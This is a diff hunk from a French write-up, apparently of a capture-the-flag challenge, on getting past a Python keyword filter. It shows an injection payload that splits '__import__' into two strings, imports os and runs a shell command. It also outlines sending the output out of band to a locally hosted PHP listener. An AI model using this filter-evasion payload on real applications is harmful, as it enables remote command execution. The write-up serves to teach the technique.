@@ -21,6 +21,7 @@
 
 - Je vais devoir builtin des fontions à partir de la class ``__builtins__``.
 - La méthode ``getattr()`` renvoie la valeur de l'attribut nommé d'une class. S'il n'est pas trouvé, il renvoie la valeur par défaut fournie à la fonction.
+- ``getattr()`` a aussi ses avantages. Il faut savoir que ``__import__`` est match. En utilisant ``getattr()`` on nous offre la possibilité de combiner ``__import__`` en deux chains afin d'éviter le filtre: ``'__imp''ort__'``.
 - ``);geattr(__builtins__,'__imp''ort__')('o''s').popen('id')#``, par défaut j'utilise une méthode de concaténation pour éviter de faire trigger la commande par le filtre.
 - N'oublions pas que la méthode ``read()`` n'est pas acceptée. Dans ce contexte on est supposé d'envoyer la requête en stdout vers un serveur web qu'on hébergera localement pour recept les données ``POST``. Tout ça ``OOB`` (Out of band). Les données ``OOB`` sont transférées via un flux indépendant du flux de données principal dans la bande.
 - J'utilise Wampserv comme hébergeur local. First of all je script la fonction suivante en ``PHP``:
